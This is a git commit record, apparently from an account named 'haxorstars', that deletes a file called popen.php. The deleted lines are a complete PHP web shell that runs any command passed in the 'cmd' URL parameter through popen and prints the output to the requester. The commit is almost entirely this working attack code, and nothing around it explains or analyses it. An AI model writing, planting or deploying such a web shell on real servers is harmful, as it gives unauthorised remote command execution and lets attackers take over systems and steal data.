4a75e9f9c376fad9f4310760796502029f334e67
NuLz <129581037+haxorstars@users.noreply.github.com>
2023-12-13 18:03:30 +0700

    NuLz

--- popen.php
+++
@@ -1,8 +0,0 @@
-<?php
-if (isset($_GET["cmd"])) {
-  $thisCMD = popen($_GET["cmd"], "r");
-  $read = fread($thisCMD, 2096);
-  print_r("$thisCMD: ".gettype($thisCMD)."\n$read \n");
-  pclose($thisCMD);
-}
-?>
